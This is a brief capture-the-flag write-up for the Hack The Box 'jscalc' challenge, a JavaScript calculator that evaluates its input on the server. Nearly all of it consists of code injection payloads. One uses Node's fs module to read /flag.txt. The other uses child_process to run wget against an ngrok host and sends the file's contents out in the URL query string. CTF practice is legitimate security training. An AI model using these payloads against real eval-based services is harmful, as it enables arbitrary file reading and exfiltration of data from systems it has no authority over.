# Hack The Box Challenge - Calculator File Reading

## Challenge Description
HTB jscalc, your goal is to run a script in the calculator input that reads the contents of a file named `flag.txt`.##  In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑


## Easy Exploit
File System Module
The easiest way is to use the fs module.

1. In the calculator input, run the following JavaScript code to get the flag:

   ```javascript
   require('fs').readFileSync('/flag.txt', 'utf8')


## Another Way To Exploit

```javascript
require('child_process').exec('wget https://fsr2-a3f2-v01v-b337-7100-212f-5c22-ecar-g5ar.ngrok-free.app?flag=$(cat /flag.txt)')
